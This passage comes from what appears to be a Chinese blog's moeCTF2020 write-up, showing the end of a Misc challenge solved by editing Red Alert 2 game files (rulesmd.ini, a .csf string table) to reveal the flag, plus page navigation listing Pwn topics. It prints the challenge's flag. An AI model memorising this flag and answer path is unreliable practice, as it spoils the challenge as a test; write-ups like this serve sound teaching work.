+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SuperWeapon&#x3D;LightningStormSpecial</span><br></pre></td></tr></table></figure>
+
+<p>看名字应该是超级武器的意思，ini中搜索<code>LightningStormSpecial</code>我们可以发现一个类似注册名单的东西，其中最新的一个为<code>UltimateSpecial</code></p>
+<p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1602093565355.png" alt="1602093565355"></p>
+<p>将天气控制仪代码中语句<code>SuperWeapon=</code>后面的<code>LightningStormSpecial</code>替换为<code>UltimateSpecial</code>，重新尝试运行游戏，建造天气控制仪，得到flag</p>
+<p>![B_T74BXSD`2@<em>Y</em>LMEZ_BAD.png](<a href="https://i.loli.net/2020/10/08/sGNzKtdwMIq8FyE.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/08/sGNzKtdwMIq8FyE.png</a>)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;enj0y_th3_p0w3r_0f_lig6tn1n9_st0rm!&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h3 id="hint-3"><a href="#hint-3" class="headerlink" title="hint - 3"></a>hint - 3</h3><p>hint3告诉我们ini修改时需要注意限制条件，并提示我们真·闪电风暴应当在新增注册名表里有</p>
+<p><img src="https://i.loli.net/2020/10/08/KR2VgHfd5cezaAF.png" alt="image.png"></p>
+</blockquote>
+<blockquote>
+<h3 id="hint-4"><a href="#hint-4" class="headerlink" title="hint - 4"></a>hint - 4</h3><p>hint4告诉我们在csf中碰运气</p>
+<p><img src="https://i.loli.net/2020/10/08/S3j5dG2kierolQI.png" alt="image.png"></p>
+<p>在先前我们解密的mix文件中确实存在一个后缀名为<code>*.csf</code>的文件</p>
+<p><img src="https://i.loli.net/2020/10/08/FG39pIlXquEgjDS.png" alt="image.png"></p>
+<p>hint1给出的工具包包含一个CSFEditor，从名字上就可以知道是用来编辑csf文件的</p>
+<p>打开后我们可以在<code>NAME</code>字段发现flag</p>
+<p><img src="https://i.loli.net/2020/10/08/bj8o5W4wCuvze1Q.png" alt="image.png"></p>
+</blockquote>
+<blockquote>
+<h3 id="EXTRA-快捷解法"><a href="#EXTRA-快捷解法" class="headerlink" title="EXTRA:快捷解法"></a>EXTRA:快捷解法</h3><p>我们在使用winhex查看<code>expandmd98.mix</code>时可以发现可以字符串<code>Name:UltimateStorm</code>，猜测为【真·闪电风暴】的UIName</p>
+<p><img src="https://i.loli.net/2020/10/08/yfndjKzWN6hrUCZ.png" alt="image.png"></p>
+<p>下载一个原版rulesmd.ini，随便更改一个单位的<code>UIName</code>字段为<code>Name:UltimateStorm</code>，再造出来也可以得到flag</p>
+<p>这里我们选择盟军基地车</p>
+<p><img src="https://i.loli.net/2020/10/08/2cbvVt1i3ZRF5DW.png" alt="image.png"></p>
+<p>一进入游戏便可以得到flag</p>
+<p><img src="https://i.loli.net/2020/10/08/oXghLYjH6aG1n49.png" alt="image.png"></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    arttnba3
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/" title="【CTF题解-0x03】moeCTF2020-partial official write up by arttnb3">http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" <i class="fa fa-tag"></i> 信息安全</a>
+          
+            <a href="/tags/PWN/" <i class="fa fa-tag"></i> PWN</a>
+          
+            <a href="/tags/ret2shellcode/" <i class="fa fa-tag"></i> ret2shellcode</a>
+          
+            <a href="/tags/python/" <i class="fa fa-tag"></i> python</a>
+          
+            <a href="/tags/CTF/" <i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/UAF/" <i class="fa fa-tag"></i> UAF</a>
+          
+            <a href="/tags/ROP/" <i class="fa fa-tag"></i> ROP</a>
+          
+            <a href="/tags/Alphanumeric-Shellcode/" <i class="fa fa-tag"></i> Alphanumeric Shellcode</a>
+          
+            <a href="/tags/ret2text/" <i class="fa fa-tag"></i> ret2text</a>
+          
+            <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" <i class="fa fa-tag"></i> 栈迁移</a>
+          
+            <a href="/tags/ret2libc/" <i class="fa fa-tag"></i> ret2libc</a>
+          
+            <a href="/tags/canary/" <i class="fa fa-tag"></i> canary</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/09/06/%E3%80%90OJ-0x0003-Leetcode%E3%80%91%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E9%83%A8%E5%88%86write-up-by-arttnba3/" rel="next" title="【OJ-0x0003-Leetcode】动态规划部分write up by arttnba3">
+                <i class="fa fa-chevron-left"></i> 【OJ-0x0003-Leetcode】动态规划部分write up by arttnba3
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/" rel="prev" title="【CTF题解-0x04】BUUCTF-Pwn write up by arttnb3">
+                【CTF题解-0x04】BUUCTF-Pwn write up by arttnb3 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+  
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="arttnba3" />
+            
+              <p class="site-author-name" itemprop="name">arttnba3</p>
+              <p class="site-description motion-element" itemprop="description">- 想成为你心目中的第一啊 -</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/arttnba3" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1543127579@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://wpa.qq.com/msgrd?v=3&uin=1543127579&site=qq&menu=yes" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/arttnba3" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://stackoverflow.com/users/13389180/arttnba3" target="_blank" title="StackOverflow">
+                      
+                        <i class="fa fa-fw fa-stack-overflow"></i>StackOverflow</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://plus.google.com/arttnba" target="_blank" title="Google">
+                      
+                        <i class="fa fa-fw fa-google"></i>Google</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Friends' Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.wootec.top" title="Reverier" target="_blank">Reverier</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://luoq1an.github.io" title="luoqian" target="_blank">luoqian</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ll1ng.github.io" title="ling" target="_blank">ling</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shal10w.github.io" title="shallow" target="_blank">shallow</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://eqqie.cn" title="eqqie" target="_blank">eqqie</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cor1e.cn" title="cor1e" target="_blank">cor1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://yunq1ao.com" title="yunqiao" target="_blank">yunqiao</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mercer5.github.io" title="mercer" target="_blank">mercer</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-绪论"><span class="nav-number">1.</span> <span class="nav-text">0x00.绪论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Pwn"><span class="nav-number">2.</span> <span class="nav-text">0x01.Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn从入门到入狱"><span class="nav-number">2.1.</span> <span class="nav-text">Pwn从入门到入狱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome"><span class="nav-number">2.2.</span> <span class="nav-text">Welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-Pwn-ret2text"><span class="nav-number">2.3.</span> <span class="nav-text">Baby Pwn - ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-Shellcode-shellcode"><span class="nav-number">2.4.</span> <span class="nav-text">Baby Shellcode - shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unusual-shellcode-Alphanumeric-Shellcode"><span class="nav-number">2.5.</span> <span class="nav-text">unusual shellcode - Alphanumeric Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP1-ret2text"><span class="nav-number">2.6.</span> <span class="nav-text">ROP1 - ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP2-ret2text"><span class="nav-number">2.7.</span> <span class="nav-text">ROP2 - ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-migration-stack-migration-ret2shellcode"><span class="nav-number">2.8.</span> <span class="nav-text">baby migration - stack migration + ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hard-shellcode-ret2shellcode"><span class="nav-number">2.9.</span> <span class="nav-text">Hard shellcode - ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easycpp（已下线）-Use-After-Free"><span class="nav-number">2.10.</span> <span class="nav-text">easycpp（已下线） - Use After Free</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-canary-canary-partial-overwrite-ret2libc"><span class="nav-number">2.11.</span> <span class="nav-text">baby canary - canary + partial overwrite + ret2libc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Misc"><span class="nav-number">3.</span> <span class="nav-text">0x02.Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简-单-的社工题"><span class="nav-number">3.1.</span> <span class="nav-text">简 单 的社工题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不-会-吧-？-就-这-¿"><span class="nav-number">3.2.</span> <span class="nav-text">不 会 吧 ？ 就 这 ¿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#A3FXCK"><span class="nav-number">3.3.</span> <span class="nav-text">A3FXCK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#⑨的完美算术教室"><span class="nav-number">3.4.</span> <span class="nav-text">⑨的完美算术教室</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#闪-电-风-暴"><span class="nav-number">3.5.</span> <span class="nav-text">闪 电 风 暴</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hint-1"><span class="nav-number">3.5.1.</span> <span class="nav-text">hint-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hint-2"><span class="nav-number">3.5.2.</span> <span class="nav-text">hint - 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hint-3"><span class="nav-number">3.5.3.</span> <span class="nav-text">hint - 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hint-4"><span class="nav-number">3.5.4.</span> <span class="nav-text">hint - 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXTRA-快捷解法"><span class="nav-number">3.5.5.</span> <span class="nav-text">EXTRA:快捷解法</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">arttnba3</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">90.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  <script src="/js/src/md5.min.js"></script>
+
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '',
+          clientSecret: '',
+          repo: 'BlogComment',
+          owner: '',
+          admin: [''],
+
+          id: md5(location.pathname),
+
+          distractionFreeMode: 'false'
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
